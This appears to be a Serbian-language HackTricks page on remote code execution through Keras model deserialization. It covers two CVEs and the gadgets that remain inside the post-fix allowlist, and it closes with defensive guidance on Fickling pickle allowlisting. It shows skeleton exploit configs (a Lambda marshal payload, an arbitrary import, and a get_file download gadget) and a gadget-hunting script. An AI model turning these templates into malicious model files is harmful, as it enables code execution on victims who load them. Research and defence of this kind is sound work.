# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ova stranica sumira praktične tehnike eksploatacije protiv Keras model deserialization pipeline-a, objašnjava interne detalje .keras formata i attack surface, i pruža alatni paket za istraživače za pronalaženje Model File Vulnerabilities (MFVs) i post-fix gadgets.

## Interna struktura .keras formata

Fajl .keras je ZIP arhiva koja sadrži najmanje:
- metadata.json – generičke informacije (npr. Keras verzija)
- config.json – arhitektura modela (primary attack surface)
- model.weights.h5 – težine u HDF5

config.json pokreće rekurzivnu deserijalizaciju: Keras importuje module, rešava klase/funkcije i rekonstruše slojeve/objekte iz rečnika koje kontroliše napadač.

Primer snippet-a za objekat Dense layer:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserializacija obavlja:
- Uvoz modula i resoluciju simbola iz module/class_name ključeva
- from_config(...) ili pozivanje konstruktora sa attacker-controlled kwargs
- Rekurzija u ugnježdene objekte (activations, initializers, constraints, etc.)

Historijski, ovo je attacker-u koji kreira config.json izložilo tri primitiva:
- Kontrola koji moduli se uvoze
- Kontrola koje klase/funkcije se rešavaju
- Kontrola kwargs koji se prosleđuju konstruktorima/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Uzrok:
- Lambda.from_config() je koristio python_utils.func_load(...) koji base64-dekodira i poziva marshal.loads() na attacker bytes; Python unmarshalling može izvršavati kod.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Ublažavanje:
- Keras podrazumevano nameće safe_mode=True. Serijalizovane Python funkcije u Lambda su blokirane osim ako korisnik eksplicitno ne isključi safe_mode=False.

Napomene:
- Zastareli formati (stare HDF5 save) ili starije baze koda možda ne primenjuju moderne provere, pa “downgrade” style napadi i dalje mogu važiti kada žrtve koriste starije učitavače.

## CVE-2025-1550 – Proizvoljan uvoz modula u Keras ≤ 3.8

Osnovni uzrok:
- _retrieve_class_or_fn je koristio neograničeno importlib.import_module() sa stringovima modula kojim napadač kontroliše iz config.json.
- Uticaj: Proizvoljan uvoz bilo kog instaliranog modula (ili modula koje je napadač postavio na sys.path). Kod koji se izvršava pri importu se pokreće, a zatim se objekat konstruiše sa kwargs koje kontroliše napadač.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sigurnosna poboljšanja (Keras ≥ 3.9):
- Lista dozvoljenih modula: importi su ograničeni na zvanične module ekosistema: keras, keras_hub, keras_cv, keras_nlp
- Podrazumevan safe mode: safe_mode=True blokira učitavanje nesigurnih Lambda serijalizovanih funkcija
- Osnovna provera tipova: deserijalizovani objekti moraju odgovarati očekivanim tipovima

## Površina gadget-a nakon popravke unutar liste dozvoljenih

Čak i uz listu dozvoljenih i safe mode, široka površina ostaje među dozvoljenim Keras callables. Na primer, keras.utils.get_file može preuzeti proizvoljne URL-ove u lokacije koje korisnik odabere.

Gadget preko Lambda koji referencira dozvoljenu funkciju (nije serijalizovani Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Važno ograničenje:
- Lambda.call() postavlja input tensor kao prvi pozicioni argument pri pozivanju ciljanog callable. Odabrani gadgeti moraju tolerisati dodatni pozicioni argument (ili prihvatiti *args/**kwargs). Ovo ograničava koje funkcije su primenljive.

Potencijalni uticaji dozvoljenih gadgeta:
- Proizvoljno preuzimanje/pisanje (path planting, config poisoning)
- Network callbacks/SSRF-like efekti u zavisnosti od okruženja
- Lančanje ka izvršenju koda ako su upisani putevi kasnije importovani/izvršeni ili dodati u PYTHONPATH, ili ako postoji zapisiva lokacija koja izvršava kod pri zapisu

## Set alata za istraživače

1) Sistematsko pronalaženje gadgeta u dozvoljenim modulima

Nabrojte kandidatne callables u modulima keras, keras_nlp, keras_cv, keras_hub i prioritizujte one koji imaju sporedne efekte na fajl, mrežu, procese ili okruženje.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Direktno testiranje deserialization (nije potrebna .keras arhiva)

Prosledi pažljivo pripremljene dicts direktno u Keras deserializers da saznaš prihvaćene params i posmatraš side effects.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Ispitivanje između verzija i formata

Keras postoji u više codebase-ova/era sa različitim mehanizmima zaštite i formatima:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, predviđen za brisanje)
- tf-keras: održava se odvojeno
- Multi-backend Keras 3 (official): introduced native .keras

Ponovite testove preko codebase-ova i formata (.keras vs legacy HDF5) da otkrijete regresije ili nedostatak zaštitnih mehanizama.

## Preporuke za odbranu

- Smatrajte fajlove modela nepouzdanim ulazom. Učitajte modele samo iz pouzdanih izvora.
- Održavajte Keras ažurnim; koristite Keras ≥ 3.9 da biste iskoristili allowlisting i provere tipova.
- Ne postavljajte safe_mode=False pri učitavanju modela osim ako u potpunosti ne verujete fajlu.
- Razmotrite pokretanje deserializacije u sandboxed, least-privileged okruženju bez network egress i sa ograničenim pristupom filesystem-u.
- Primjenjujte allowlists/signatures za izvore modela i provere integriteta gde je moguće.

## ML pickle import allowlisting za AI/ML modele (Fickling)

Mnogi AI/ML formati modela (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, stariji TensorFlow artefakti, itd.) ugrađuju Python pickle podatke. Napadači rutinski zloupotrebljavaju pickle GLOBAL imports i konstruktore objekata da bi postigli RCE ili zamenu modela tokom učitavanja. Skeneri zasnovani na blacklistama često propuštaju nove ili nenavedene opasne imports.

Praktična fail-closed odbrana je da se hook-uje Python-ov pickle deserializer i dozvoljava samo pregledani skup harmless ML-related imports tokom unpickling-a. Trail of Bits’ Fickling implementira ovu politiku i dolazi sa kuriranom ML import allowlist-om sastavljenom iz hiljada javnih Hugging Face pickles.

Bezbednosni model za “safe” imports (intuicije destilovane iz istraživanja i prakse): importovani simboli koje pickle koristi moraju istovremeno:
- Ne izvršavati kod niti prouzrokovati izvršenje (bez compiled/source code objekata, shelling out, hooks, itd.)
- Ne dobijati/postavljati proizvoljne atribute ili stavke
- Ne importovati niti dobavljati reference na druge Python objekte iz pickle VM-a
- Ne pokretati sekundarne deserializere (npr. marshal, nested pickle), čak ni indirektno

Omogućite Fickling-ovu zaštitu što ranije u pokretanju procesa tako da su svi pickle load-ovi koje obavljaju framework-i (torch.load, joblib.load, itd.) provereni:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operativni saveti:
- Privremeno možete onemogućiti/ponovo omogućiti hooks gde je potrebno:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Ako je poznati ispravan model blokiran, proširite allowlist za vaše okruženje nakon pregleda simbola:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling takođe izlaže generičke runtime garde ako želite granularniju kontrolu:
- fickling.always_check_safety() — da nametne provere za sve pickle.load()
- with fickling.check_safety(): — za ograničeno sprovođenje
- fickling.load(path) / fickling.is_likely_safe(path) — za jednokratne provere

- Preferirajte formate modela koji nisu pickle kada je moguće (npr. SafeTensors). Ako morate prihvatiti pickle, pokrećite loadere sa najmanjim privilegijama, bez network egress-a, i primenjujte allowlist.

Ova allowlist-first strategija dokazano blokira uobičajene ML pickle puteve eksploatacije dok održava visoku kompatibilnost. U ToB-ovom benchmarku, Fickling je označio 100% sintetičkih malicioznih fajlova i dozvolio ~99% čistih fajlova iz vodećih Hugging Face repos.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
